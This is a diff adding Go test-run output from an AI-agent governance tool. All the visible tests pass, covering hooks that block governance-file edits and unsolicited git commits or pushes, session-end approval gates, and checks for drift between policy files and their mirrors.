+  OK                   node-implementation (1.4.0)
+  OK                   otel-grafana-dashboards (1.0.0)
+  OK                   postman-collection-generator (1.0.0)
+  OK                   prompt-enricher (1.0.0)
+  OK                   pull-request (1.0.0)
+  OK                   refactor (1.2.0)
+  OK                   review (1.4.0)
+  OK                   semantic-commit (1.1.0)
+  OK                   us-to-prd (1.0.1)
+  DESATUALIZADO        .github/hooks/governance.json (gate de encerramento do Copilot com chave obsoleta ou ausente)
+
+Resumo: 25 atualizadas, 1 desatualizadas (0 refs divergentes), 0 ausentes
+    -> .github/hooks/governance.json reparado (chave obsoleta migrada para "agentStop")
+=== RUN   TestPostToolHookDispatchBlocksGovernanceFileEdit/copilot
+--- PASS: TestUpgradeRepairsPreexistingObsoleteCopilotGovernance (0.96s)
+=== CONT  TestClaudeMemoryCompactionDirectiveE2E
+2026/09/18 14:44:45 runner: durable memory disabled (RF-28); legacy path preserved
+2026/09/18 14:44:45 [memory_persist] Memory Compaction Requested: false
+2026/09/18 14:44:45 [memory_persist] Memory Workflow Bytes: 238
+2026/09/18 14:44:45 [memory_persist] Task:  | Events: 2 | Tool Calls: 0
+2026/09/18 14:44:45 INFO connection closed cause="io: read/write on closed pipe"
+2026/09/18 14:44:45 INFO connection closed cause="peer connection closed"
+--- PASS: TestClaudeMemoryCompactionDirectiveE2E (0.02s)
+=== CONT  TestClaudeNormalizationCrossToolE2E
+=== RUN   TestClaudeNormalizationCrossToolE2E/T-INT-02a:_bash_normalizado_em_sessao_Claude_(RF-02.1)
+=== PAUSE TestClaudeNormalizationCrossToolE2E/T-INT-02a:_bash_normalizado_em_sessao_Claude_(RF-02.1)
+=== RUN   TestClaudeNormalizationCrossToolE2E/T-INT-02b:_NoNormalize=true_preserva_evento_sem_metadata_(RF-02.4)
+=== PAUSE TestClaudeNormalizationCrossToolE2E/T-INT-02b:_NoNormalize=true_preserva_evento_sem_metadata_(RF-02.4)
+=== RUN   TestClaudeNormalizationCrossToolE2E/T-INT-02c:_MarshalJSON_inclui_normalized_name_e_raw_name_no_JSONL_(RF-02.1)
+=== PAUSE TestClaudeNormalizationCrossToolE2E/T-INT-02c:_MarshalJSON_inclui_normalized_name_e_raw_name_no_JSONL_(RF-02.1)
+=== RUN   TestClaudeNormalizationCrossToolE2E/T-INT-02d:_regressao_T-19_—_sessao_F1-Claude_sem_flags_novas_(RF-02,_C-01)
+=== PAUSE TestClaudeNormalizationCrossToolE2E/T-INT-02d:_regressao_T-19_—_sessao_F1-Claude_sem_flags_novas_(RF-02,_C-01)
+=== CONT  TestClaudeMCPNestedAgentE2E
+2026/09/18 14:44:45 runner: durable memory disabled (RF-28); legacy path preserved
+--- PASS: TestClaudeMCPNestedAgentE2E (0.00s)
+=== CONT  TestSessionEndGateJSONModeEmitsBlockDecisionOnStdout
+2026/09/18 14:44:45 INFO connection closed cause="io: read/write on closed pipe"
+2026/09/18 14:44:45 INFO connection closed cause="peer connection closed"
+=== CONT  TestSkillsSyncGateAllowlistsNonSkillDirectories
+--- PASS: TestPostToolHookDispatchAllowsRegularFileEdit (1.36s)
+    --- PASS: TestPostToolHookDispatchAllowsRegularFileEdit/claude (0.12s)
+    --- PASS: TestPostToolHookDispatchAllowsRegularFileEdit/codex (0.16s)
+    --- PASS: TestPostToolHookDispatchAllowsRegularFileEdit/copilot (0.10s)
+=== RUN   TestPreToolHookDispatchAllowsReadOnlyGitCommandsWithPreloadConfirmed/claude/git_log_--oneline_-5
+=== RUN   TestToolHooksDispatchNativeApplyPatchPayload/copilot/pre
+=== RUN   TestPreToolHookDispatchAllowsNonCodeFiles/copilot
+--- PASS: TestPostToolHookDispatchBlocksGovernanceFileEdit (1.38s)
+    --- PASS: TestPostToolHookDispatchBlocksGovernanceFileEdit/claude (0.16s)
+    --- PASS: TestPostToolHookDispatchBlocksGovernanceFileEdit/codex (0.10s)
+    --- PASS: TestPostToolHookDispatchBlocksGovernanceFileEdit/copilot (0.12s)
+=== CONT  TestSyncGatesFailWhenCanonicalDirectoryIsDeleted
+=== RUN   TestSyncGatesFailWhenCanonicalDirectoryIsDeleted/.agents/lib
+=== PAUSE TestSyncGatesFailWhenCanonicalDirectoryIsDeleted/.agents/lib
+=== RUN   TestSyncGatesFailWhenCanonicalDirectoryIsDeleted/.agents/hooks
+=== PAUSE TestSyncGatesFailWhenCanonicalDirectoryIsDeleted/.agents/hooks
+=== RUN   TestSyncGatesFailWhenCanonicalDirectoryIsDeleted/.agents/scripts
+=== PAUSE TestSyncGatesFailWhenCanonicalDirectoryIsDeleted/.agents/scripts
+=== RUN   TestSyncGatesFailWhenCanonicalDirectoryIsDeleted/.agents/skills
+=== PAUSE TestSyncGatesFailWhenCanonicalDirectoryIsDeleted/.agents/skills
+=== RUN   TestSyncGatesFailWhenCanonicalDirectoryIsDeleted/.agents/policies
+=== PAUSE TestSyncGatesFailWhenCanonicalDirectoryIsDeleted/.agents/policies
+=== CONT  TestClaudeLocalOnlyHookStaysOutOfEmbeddedMirror
+--- PASS: TestPreToolHookDispatchBlocksUnsolicitedGitCommitAndPushEvenWithPreloadConfirmed (4.43s)
+    --- PASS: TestPreToolHookDispatchBlocksUnsolicitedGitCommitAndPushEvenWithPreloadConfirmed/claude/git_commit_-m_x (0.56s)
+    --- PASS: TestPreToolHookDispatchBlocksUnsolicitedGitCommitAndPushEvenWithPreloadConfirmed/codex/git_commit_-m_x (0.54s)
+    --- PASS: TestPreToolHookDispatchBlocksUnsolicitedGitCommitAndPushEvenWithPreloadConfirmed/copilot/git_commit_-m_x (0.96s)
+    --- PASS: TestPreToolHookDispatchBlocksUnsolicitedGitCommitAndPushEvenWithPreloadConfirmed/claude/git_push_origin_main (0.49s)
+    --- PASS: TestPreToolHookDispatchBlocksUnsolicitedGitCommitAndPushEvenWithPreloadConfirmed/codex/git_push_origin_main (0.46s)
+    --- PASS: TestPreToolHookDispatchBlocksUnsolicitedGitCommitAndPushEvenWithPreloadConfirmed/copilot/git_push_origin_main (0.52s)
+=== CONT  TestClaudeCrossWaveSmokeE2E
+2026/09/18 14:44:45 runner: durable memory disabled (RF-28); legacy path preserved
+--- PASS: TestSessionEndGateJSONModeEmitsBlockDecisionOnStdout (0.14s)
+=== CONT  TestCodexLegacyHooksJSONIsNotShipped
+2026/09/18 14:44:45 [memory_persist] Memory Compaction Requested: false
+2026/09/18 14:44:45 [memory_persist] Memory Workflow Bytes: 238
+2026/09/18 14:44:45 [memory_persist] Task:  | Events: 8 | Tool Calls: 2
+2026/09/18 14:44:45 runner: durable memory disabled (RF-28); legacy path preserved
+2026/09/18 14:44:45 [memory_persist] Memory Compaction Requested: false
+2026/09/18 14:44:45 [memory_persist] Memory Workflow Bytes: 238
+2026/09/18 14:44:45 [memory_persist] Task:  | Events: 8 | Tool Calls: 2
+=== NAME  TestClaudeCrossWaveSmokeE2E
+    claude_2026_e2e_test.go:761: T-INT-06: OK — MCP spawned=1 events=18 review=ok cancelReason=none
+2026/09/18 14:44:45 INFO connection closed cause="io: read/write on closed pipe"
+2026/09/18 14:44:45 INFO connection closed cause="peer connection closed"
+2026/09/18 14:44:45 INFO connection closed cause="io: read/write on closed pipe"
+2026/09/18 14:44:45 INFO connection closed cause="peer connection closed"
+--- PASS: TestClaudeCrossWaveSmokeE2E (0.11s)
+=== CONT  TestClaudeAutoReviewBlocksOnHardIssueE2E
+2026/09/18 14:44:45 runner: durable memory disabled (RF-28); legacy path preserved
+=== RUN   TestToolHooksDispatchNativeApplyPatchPayload/claude/post
+2026/09/18 14:44:46 runner: durable memory disabled (RF-28); legacy path preserved
+2026/09/18 14:44:46 INFO connection closed cause="io: read/write on closed pipe"
+2026/09/18 14:44:46 INFO connection closed cause="io: read/write on closed pipe"
+2026/09/18 14:44:46 INFO connection closed cause="peer connection closed"
+2026/09/18 14:44:46 INFO connection closed cause="peer connection closed"
+--- PASS: TestClaudeAutoReviewBlocksOnHardIssueE2E (0.11s)
+=== CONT  TestSkillsLockGateFailsWhenLockedSkillDrifts
+=== RUN   TestToolHooksDispatchNativeApplyPatchPayload/codex/post
+=== RUN   TestPreToolHookDispatchAllowsReadOnlyGitCommandsWithPreloadConfirmed/codex/git_log_--oneline_-5
+=== RUN   TestPreToolHookDispatchAllowsNonCodeFiles/claude
+=== RUN   TestToolHooksDispatchNativeApplyPatchPayload/copilot/post
+--- PASS: TestToolHooksDispatchNativeApplyPatchPayload (2.15s)
+    --- PASS: TestToolHooksDispatchNativeApplyPatchPayload/claude/pre (0.39s)
+    --- PASS: TestToolHooksDispatchNativeApplyPatchPayload/codex/pre (0.31s)
+    --- PASS: TestToolHooksDispatchNativeApplyPatchPayload/copilot/pre (0.21s)
+    --- PASS: TestToolHooksDispatchNativeApplyPatchPayload/claude/post (0.08s)
+    --- PASS: TestToolHooksDispatchNativeApplyPatchPayload/codex/post (0.07s)
+    --- PASS: TestToolHooksDispatchNativeApplyPatchPayload/copilot/post (0.06s)
+=== CONT  TestSnapshotGateFailsOnDeliberateDrift
+=== RUN   TestPreToolHookDispatchAllowsReadOnlyGitCommandsWithPreloadConfirmed/copilot/git_log_--oneline_-5
+--- PASS: TestPreToolHookDispatchAllowsNonCodeFiles (1.95s)
+    --- PASS: TestPreToolHookDispatchAllowsNonCodeFiles/codex (0.54s)
+    --- PASS: TestPreToolHookDispatchAllowsNonCodeFiles/copilot (0.31s)
+    --- PASS: TestPreToolHookDispatchAllowsNonCodeFiles/claude (0.25s)
+=== CONT  TestSyncGatesFailWhenCentralArtifactIsDeleted
+=== RUN   TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/scripts/validate-session-end.sh
+=== PAUSE TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/scripts/validate-session-end.sh
+=== RUN   TestSyncGatesFailWhenCentralArtifactIsDeleted/.opencode/plugin/governance.js
+=== PAUSE TestSyncGatesFailWhenCentralArtifactIsDeleted/.opencode/plugin/governance.js
+=== RUN   TestSyncGatesFailWhenCentralArtifactIsDeleted/internal/embedded/assets/.opencode/plugin/governance.js
+=== PAUSE TestSyncGatesFailWhenCentralArtifactIsDeleted/internal/embedded/assets/.opencode/plugin/governance.js
+=== RUN   TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/hooks/validate-preload.sh
+=== PAUSE TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/hooks/validate-preload.sh
+=== RUN   TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/scripts/hook-prereq-gate.sh
+=== PAUSE TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/scripts/hook-prereq-gate.sh
+=== RUN   TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/scripts/git-operation-gate.sh
+=== PAUSE TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/scripts/git-operation-gate.sh
+=== RUN   TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/scripts/validate-task-evidence.sh
+=== PAUSE TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/scripts/validate-task-evidence.sh
+=== RUN   TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/scripts/resolve-references.sh
+=== PAUSE TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/scripts/resolve-references.sh
+=== RUN   TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/scripts/validate-skill-prerequisites.sh
+=== PAUSE TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/scripts/validate-skill-prerequisites.sh
+=== RUN   TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/lib/check-invocation-depth.sh
+=== PAUSE TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/lib/check-invocation-depth.sh
+=== RUN   TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/lib/parse-hook-input.sh
+=== PAUSE TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/lib/parse-hook-input.sh
+=== RUN   TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/hooks/post-execute-task.sh
+=== PAUSE TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/hooks/post-execute-task.sh
+=== RUN   TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/hooks/subagent-stop-wrapper.sh
+=== PAUSE TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/hooks/subagent-stop-wrapper.sh
+=== RUN   TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/hooks/validate-session-end.sh
+=== PAUSE TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/hooks/validate-session-end.sh
+=== RUN   TestSyncGatesFailWhenCentralArtifactIsDeleted/.claude/scripts/validate-session-end.sh
+=== PAUSE TestSyncGatesFailWhenCentralArtifactIsDeleted/.claude/scripts/validate-session-end.sh
+=== RUN   TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/policies/governance.md
+=== PAUSE TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/policies/governance.md
+=== RUN   TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/policies/code-style.md
+=== PAUSE TestSyncGatesFailWhenCentralArtifactIsDeleted/.agents/policies/code-style.md
+=== CONT  TestSkillsSyncGateFailsWhenCanonicalSkillIsMissingFromMirror
+=== RUN   TestSkillsSyncGateFailsWhenCanonicalSkillIsMissingFromMirror/.claude/skills
+=== PAUSE TestSkillsSyncGateFailsWhenCanonicalSkillIsMissingFromMirror/.claude/skills
+=== RUN   TestSkillsSyncGateFailsWhenCanonicalSkillIsMissingFromMirror/.github/skills
+=== PAUSE TestSkillsSyncGateFailsWhenCanonicalSkillIsMissingFromMirror/.github/skills
+=== RUN   TestSkillsSyncGateFailsWhenCanonicalSkillIsMissingFromMirror/internal/embedded/assets/.agents/skills
+=== PAUSE TestSkillsSyncGateFailsWhenCanonicalSkillIsMissingFromMirror/internal/embedded/assets/.agents/skills
+=== CONT  TestSyncGatesAreGreenOnUntouchedClone
+--- PASS: TestPreToolHookDispatchAllowsReadOnlyGitCommandsWithPreloadConfirmed (5.34s)
+    --- PASS: TestPreToolHookDispatchAllowsReadOnlyGitCommandsWithPreloadConfirmed/claude/git_status (0.56s)
+    --- PASS: TestPreToolHookDispatchAllowsReadOnlyGitCommandsWithPreloadConfirmed/codex/git_status (0.55s)
+    --- PASS: TestPreToolHookDispatchAllowsReadOnlyGitCommandsWithPreloadConfirmed/copilot/git_status (1.00s)
+    --- PASS: TestPreToolHookDispatchAllowsReadOnlyGitCommandsWithPreloadConfirmed/claude/git_diff (0.53s)
+    --- PASS: TestPreToolHookDispatchAllowsReadOnlyGitCommandsWithPreloadConfirmed/codex/git_diff (0.50s)
+    --- PASS: TestPreToolHookDispatchAllowsReadOnlyGitCommandsWithPreloadConfirmed/copilot/git_diff (0.48s)
+    --- PASS: TestPreToolHookDispatchAllowsReadOnlyGitCommandsWithPreloadConfirmed/claude/git_log_--oneline_-5 (0.33s)
+    --- PASS: TestPreToolHookDispatchAllowsReadOnlyGitCommandsWithPreloadConfirmed/codex/git_log_--oneline_-5 (0.25s)
+    --- PASS: TestPreToolHookDispatchAllowsReadOnlyGitCommandsWithPreloadConfirmed/copilot/git_log_--oneline_-5 (0.24s)
+=== CONT  TestSnapshotGateIsGreenOnUntouchedClone
+--- PASS: TestCodexLegacyHooksJSONIsNotShipped (2.54s)
+=== CONT  TestSessionEndGateReadsTheCanonicalVerdictBlockOfTheExecutionReport/diff-reviewed_block_approved
+=== CONT  TestSessionEndGateReadsTheCanonicalVerdictBlockOfTheExecutionReport/prose_reviewer_verdict_approved
+=== CONT  TestSessionEndGateReadsTheCanonicalVerdictBlockOfTheExecutionReport/prose_reviewer_verdict_rejected
+--- PASS: TestClaudeLocalOnlyHookStaysOutOfEmbeddedMirror (2.87s)
+=== CONT  TestSessionEndGateReadsTheCanonicalVerdictBlockOfTheExecutionReport/prose_reviewer_verdict_with_remarks
+=== CONT  TestSessionEndGateReadsTheCanonicalVerdictBlockOfTheExecutionReport/diff-reviewed_block_with_remarks
+=== CONT  TestSessionEndGateAllowsWhenNoActiveTaskOrApproved/copilot/pending
+=== CONT  TestSessionEndGateBlocksActiveTaskWithoutApprovedVerdict/claude
+--- PASS: TestSessionEndGateReadsTheCanonicalVerdictBlockOfTheExecutionReport (0.00s)
+    --- PASS: TestSessionEndGateReadsTheCanonicalVerdictBlockOfTheExecutionReport/diff-reviewed_block_approved (0.10s)
+    --- PASS: TestSessionEndGateReadsTheCanonicalVerdictBlockOfTheExecutionReport/prose_reviewer_verdict_approved (0.19s)
+    --- PASS: TestSessionEndGateReadsTheCanonicalVerdictBlockOfTheExecutionReport/prose_reviewer_verdict_rejected (0.13s)
+    --- PASS: TestSessionEndGateReadsTheCanonicalVerdictBlockOfTheExecutionReport/prose_reviewer_verdict_with_remarks (0.14s)
+    --- PASS: TestSessionEndGateReadsTheCanonicalVerdictBlockOfTheExecutionReport/diff-reviewed_block_with_remarks (0.12s)
+=== CONT  TestSessionEndGateAllowsWhenNoActiveTaskOrApproved/opencode/done-approved
+=== CONT  TestSessionEndGateAllowsWhenNoActiveTaskOrApproved/codex/approved
+=== CONT  TestSessionEndGateAllowsWhenNoActiveTaskOrApproved/codex/done-approved
+=== CONT  TestSessionEndGateAllowsWhenNoActiveTaskOrApproved/codex/pending
+=== CONT  TestSessionEndGateAllowsWhenNoActiveTaskOrApproved/claude/approved
+=== CONT  TestSessionEndGateAllowsWhenNoActiveTaskOrApproved/claude/done-approved
+=== CONT  TestSessionEndGateAllowsWhenNoActiveTaskOrApproved/claude/pending
+=== CONT  TestSessionEndGateAllowsWhenNoActiveTaskOrApproved/opencode/approved
+=== CONT  TestSessionEndGateAllowsWhenNoActiveTaskOrApproved/copilot/approved
+=== CONT  TestSessionEndGateAllowsWhenNoActiveTaskOrApproved/opencode/pending
+=== CONT  TestSessionEndGateAllowsWhenNoActiveTaskOrApproved/copilot/done-approved
+=== CONT  TestSessionEndGateBlocksActiveTaskWithoutApprovedVerdict/opencode
+--- PASS: TestSessionEndGateAllowsWhenNoActiveTaskOrApproved (0.00s)
+    --- PASS: TestSessionEndGateAllowsWhenNoActiveTaskOrApproved/copilot/pending (0.10s)
+    --- PASS: TestSessionEndGateAllowsWhenNoActiveTaskOrApproved/opencode/done-approved (0.21s)
+    --- PASS: TestSessionEndGateAllowsWhenNoActiveTaskOrApproved/codex/approved (0.17s)
+    --- PASS: TestSessionEndGateAllowsWhenNoActiveTaskOrApproved/codex/done-approved (0.16s)
+    --- PASS: TestSessionEndGateAllowsWhenNoActiveTaskOrApproved/codex/pending (0.20s)
+    --- PASS: TestSessionEndGateAllowsWhenNoActiveTaskOrApproved/claude/approved (0.17s)
+    --- PASS: TestSessionEndGateAllowsWhenNoActiveTaskOrApproved/claude/done-approved (0.17s)
+    --- PASS: TestSessionEndGateAllowsWhenNoActiveTaskOrApproved/claude/pending (0.16s)
+    --- PASS: TestSessionEndGateAllowsWhenNoActiveTaskOrApproved/opencode/approved (0.15s)
+    --- PASS: TestSessionEndGateAllowsWhenNoActiveTaskOrApproved/copilot/approved (0.16s)
+    --- PASS: TestSessionEndGateAllowsWhenNoActiveTaskOrApproved/opencode/pending (0.13s)
+    --- PASS: TestSessionEndGateAllowsWhenNoActiveTaskOrApproved/copilot/done-approved (0.17s)
+=== CONT  TestSessionEndGateBlocksActiveTaskWithoutApprovedVerdict/copilot
+=== CONT  TestSessionEndGateBlocksActiveTaskWithoutApprovedVerdict/codex
+=== CONT  TestSessionEndGateBlocksTaskClosedAsDoneWithoutApprovedVerdict/copilot/no-report
+--- PASS: TestSessionEndGateBlocksActiveTaskWithoutApprovedVerdict (0.00s)
+    --- PASS: TestSessionEndGateBlocksActiveTaskWithoutApprovedVerdict/claude (0.16s)
+    --- PASS: TestSessionEndGateBlocksActiveTaskWithoutApprovedVerdict/opencode (0.13s)
+    --- PASS: TestSessionEndGateBlocksActiveTaskWithoutApprovedVerdict/copilot (0.15s)
+    --- PASS: TestSessionEndGateBlocksActiveTaskWithoutApprovedVerdict/codex (0.19s)
+=== CONT  TestSessionEndGateBlocksTaskClosedAsDoneWithoutApprovedVerdict/codex/approved-with-remarks
+=== CONT  TestSessionEndGateBlocksTaskClosedAsDoneWithoutApprovedVerdict/codex/no-report
+=== CONT  TestSessionEndGateBlocksTaskClosedAsDoneWithoutApprovedVerdict/claude/approved-with-remarks
+=== CONT  TestSessionEndGateBlocksTaskClosedAsDoneWithoutApprovedVerdict/claude/no-report
+=== CONT  TestSessionEndGateBlocksTaskClosedAsDoneWithoutApprovedVerdict/opencode/approved-with-remarks
+=== CONT  TestSessionEndGateBlocksTaskClosedAsDoneWithoutApprovedVerdict/opencode/no-report
+=== CONT  TestSessionEndGateBlocksTaskClosedAsDoneWithoutApprovedVerdict/copilot/approved-with-remarks
+=== CONT  TestSyncGatesFailOnSessionEndDriftInEveryMirror/.agents/hooks/validate-session-end.sh
+--- PASS: TestSkillsSyncGateAllowlistsNonSkillDirectories (5.36s)
+=== CONT  TestSyncGatesFailOnSessionEndDriftInEveryMirror/internal/embedded/assets/.agents/scripts/validate-session-end.sh
+--- PASS: TestSessionEndGateBlocksTaskClosedAsDoneWithoutApprovedVerdict (0.00s)
+    --- PASS: TestSessionEndGateBlocksTaskClosedAsDoneWithoutApprovedVerdict/copilot/no-report (0.19s)
+    --- PASS: TestSessionEndGateBlocksTaskClosedAsDoneWithoutApprovedVerdict/codex/no-report (0.14s)
+    --- PASS: TestSessionEndGateBlocksTaskClosedAsDoneWithoutApprovedVerdict/codex/approved-with-remarks (0.23s)
+    --- PASS: TestSessionEndGateBlocksTaskClosedAsDoneWithoutApprovedVerdict/claude/no-report (0.16s)
+    --- PASS: TestSessionEndGateBlocksTaskClosedAsDoneWithoutApprovedVerdict/claude/approved-with-remarks (0.21s)
+    --- PASS: TestSessionEndGateBlocksTaskClosedAsDoneWithoutApprovedVerdict/opencode/no-report (0.14s)
+    --- PASS: TestSessionEndGateBlocksTaskClosedAsDoneWithoutApprovedVerdict/opencode/approved-with-remarks (0.22s)
+    --- PASS: TestSessionEndGateBlocksTaskClosedAsDoneWithoutApprovedVerdict/copilot/approved-with-remarks (0.44s)
+=== CONT  TestSyncGatesFailOnSessionEndDriftInEveryMirror/.codex/hooks/validate-session-end.sh
+--- PASS: TestSyncGatesAreGreenOnUntouchedClone (5.14s)
+=== CONT  TestSyncGatesFailOnSessionEndDriftInEveryMirror/internal/embedded/assets/.agents/hooks/validate-session-end.sh
+=== CONT  TestSyncGatesFailOnSessionEndDriftInEveryMirror/.github/hooks/validate-session-end.sh
+=== CONT  TestSyncGatesFailOnSessionEndDriftInEveryMirror/.claude/scripts/validate-session-end.sh
+=== CONT  TestSyncGatesFailOnSessionEndDriftInEveryMirror/.claude/hooks/validate-session-end.sh
+=== CONT  TestSyncGatesFailOnSessionEndDriftInEveryMirror/internal/embedded/assets/.codex/hooks/validate-session-end.sh
+=== CONT  TestSyncGatesFailOnSessionEndDriftInEveryMirror/internal/embedded/assets/.github/hooks/validate-session-end.sh
+=== CONT  TestSyncGatesFailOnSessionEndDriftInEveryMirror/internal/embedded/assets/.claude/scripts/validate-session-end.sh
+=== CONT  TestSyncGatesFailOnSessionEndDriftInEveryMirror/internal/embedded/assets/.claude/hooks/validate-session-end.sh
+=== CONT  TestPreToolDecisionIsIdenticalAcrossAllFourAgents/go-file-unconfirmed
+--- PASS: TestSnapshotGateFailsOnDeliberateDrift (12.93s)
+=== CONT  TestPreToolDecisionIsIdenticalAcrossAllFourAgents/markdown-file
+--- PASS: TestSnapshotGateIsGreenOnUntouchedClone (12.62s)
+=== CONT  TestPreToolDecisionIsIdenticalAcrossAllFourAgents/go-file-confirmed-skill-missing
+=== CONT  TestClaudeRulesMirrorMatchesPreMigrationBaseline/.claude/rules/governance.md
+=== CONT  TestPoliciesSyncGateFailsOnCanonicalOnlyEdit/.agents/policies/governance.md
+=== CONT  TestClaudeRulesMirrorMatchesPreMigrationBaseline/.claude/rules/code-style.md
+--- PASS: TestClaudeRulesMirrorMatchesPreMigrationBaseline (0.00s)
+    --- PASS: TestClaudeRulesMirrorMatchesPreMigrationBaseline/.claude/rules/governance.md (0.06s)
+    --- PASS: TestClaudeRulesMirrorMatchesPreMigrationBaseline/.claude/rules/code-style.md (0.09s)
+=== CONT  TestPoliciesSyncGateFailsOnMirrorOnlyEdit/.claude/rules/governance.md
+=== CONT  TestPoliciesSyncGateFailsOnCanonicalOnlyEdit/.agents/policies/code-style.md
+=== CONT  TestPoliciesSyncGateFailsOnMirrorOnlyDeletion/.claude/rules/governance.md
+--- PASS: TestSkillsLockGateFailsWhenLockedSkillDrifts (15.83s)
+=== CONT  TestPoliciesSyncGateFailsOnMirrorOnlyEdit/.claude/rules/code-style.md
+--- PASS: TestSkillsLockGateIsGreenOnUntouchedClone (16.67s)
+=== CONT  TestPoliciesSyncGateFailsOnMirrorOnlyDeletion/.claude/rules/code-style.md
+--- PASS: TestSyncGatesFailOnSessionEndDriftInEveryMirror (0.00s)
+    --- PASS: TestSyncGatesFailOnSessionEndDriftInEveryMirror/.agents/hooks/validate-session-end.sh (2.91s)
+    --- PASS: TestSyncGatesFailOnSessionEndDriftInEveryMirror/internal/embedded/assets/.agents/scripts/validate-session-end.sh (2.81s)
+    --- PASS: TestSyncGatesFailOnSessionEndDriftInEveryMirror/.codex/hooks/validate-session-end.sh (2.75s)
+    --- PASS: TestSyncGatesFailOnSessionEndDriftInEveryMirror/internal/embedded/assets/.agents/hooks/validate-session-end.sh (3.12s)
+    --- PASS: TestSyncGatesFailOnSessionEndDriftInEveryMirror/.github/hooks/validate-session-end.sh (4.30s)
+    --- PASS: TestSyncGatesFailOnSessionEndDriftInEveryMirror/.claude/hooks/validate-session-end.sh (4.52s)
+    --- PASS: TestSyncGatesFailOnSessionEndDriftInEveryMirror/internal/embedded/assets/.codex/hooks/validate-session-end.sh (3.85s)
+    --- PASS: TestSyncGatesFailOnSessionEndDriftInEveryMirror/.claude/scripts/validate-session-end.sh (4.74s)
+    --- PASS: TestSyncGatesFailOnSessionEndDriftInEveryMirror/internal/embedded/assets/.github/hooks/validate-session-end.sh (3.15s)
+    --- PASS: TestSyncGatesFailOnSessionEndDriftInEveryMirror/internal/embedded/assets/.claude/hooks/validate-session-end.sh (3.15s)
+    --- PASS: TestSyncGatesFailOnSessionEndDriftInEveryMirror/internal/embedded/assets/.claude/scripts/validate-session-end.sh (3.67s)
+=== CONT  TestPreToolHookDecisionIsIdenticalAcrossAgents/empty-payload
+=== CONT  TestPreToolHookDecisionIsIdenticalAcrossAgents/go-file-confirmed
+--- PASS: TestPreToolDecisionIsIdenticalAcrossAllFourAgents (0.92s)
+    --- PASS: TestPreToolDecisionIsIdenticalAcrossAllFourAgents/go-file-unconfirmed (2.79s)
+    --- PASS: TestPreToolDecisionIsIdenticalAcrossAllFourAgents/go-file-confirmed-skill-missing (2.39s)
+    --- PASS: TestPreToolDecisionIsIdenticalAcrossAllFourAgents/markdown-file (3.65s)
+=== CONT  TestPreToolHookDecisionIsIdenticalAcrossAgents/apply-patch-go
+=== CONT  TestPreToolHookDecisionIsIdenticalAcrossAgents/markdown-file
+=== CONT  TestPreToolHookDecisionIsIdenticalAcrossAgents/go-file-unconfirmed
+=== CONT  TestPreToolHookDecisionIsIdenticalAcrossAgents/empty-payload-confirmed
+=== CONT  TestSessionEndHookDispatchAllowsApprovedVerdict/copilot
+Ferramentas: [claude codex copilot]
+Linguagens:  [node]
+
+-> Instalando skills canonicas...
+--- PASS: TestPoliciesSyncGateFailsOnCanonicalOnlyEdit (0.00s)
+    --- PASS: TestPoliciesSyncGateFailsOnCanonicalOnlyEdit/.agents/policies/governance.md (2.79s)
+    --- PASS: TestPoliciesSyncGateFailsOnCanonicalOnlyEdit/.agents/policies/code-style.md (2.91s)
+=== CONT  TestSessionEndHookDispatchBlocksActiveTaskWithoutApprovedVerdict/claude
+Ferramentas: [claude codex copilot]
+Linguagens:  [node]
+
+-> Instalando skills canonicas...
+--- PASS: TestPoliciesSyncGateFailsOnMirrorOnlyEdit (0.00s)
+    --- PASS: TestPoliciesSyncGateFailsOnMirrorOnlyEdit/.claude/rules/governance.md (2.85s)
+    --- PASS: TestPoliciesSyncGateFailsOnMirrorOnlyEdit/.claude/rules/code-style.md (2.84s)
+=== CONT  TestSessionEndHookDispatchAllowsApprovedVerdict/codex
+Ferramentas: [claude codex copilot]
+Linguagens:  [node]
+
+-> Instalando skills canonicas...
+--- PASS: TestPoliciesSyncGateFailsOnMirrorOnlyDeletion (0.00s)
+    --- PASS: TestPoliciesSyncGateFailsOnMirrorOnlyDeletion/.claude/rules/governance.md (2.77s)
+    --- PASS: TestPoliciesSyncGateFailsOnMirrorOnlyDeletion/.claude/rules/code-style.md (2.59s)
+=== CONT  TestSessionEndHookDispatchAllowsApprovedVerdict/claude
+Ferramentas: [claude codex copilot]
+Linguagens:  [node]
+
+-> Instalando skills canonicas...
+-> Instalando claude...
+-> Instalando claude...
+-> Instalando claude...
+-> Instalando claude...
+-> Instalando codex...
+-> Instalando copilot...
+-> Instalando codex...
+-> Instalando copilot...
+=== CONT  TestSessionEndHookDispatchBlocksActiveTaskWithoutApprovedVerdict/copilot
+Ferramentas: [claude codex copilot]
+Linguagens:  [node]
+
+-> Instalando skills canonicas...
+-> Instalando codex...
+-> Instalando codex...
+-> Instalando copilot...
+-> Instalando copilot...
+=== CONT  TestSessionEndHookDispatchBlocksActiveTaskWithoutApprovedVerdict/codex
+Ferramentas: [claude codex copilot]
+Linguagens:  [node]
+
+-> Instalando skills canonicas...
+
+Governanca para IA instalada em: /var/folders/hg/97c4drd559zgx8mztt_4b6fw0000gn/T/TestSessionEndHookDispatchAllowsApprovedVerdictcopilot3516670102/001
+Modo de instalacao: copy
+-> Instalando claude...
+
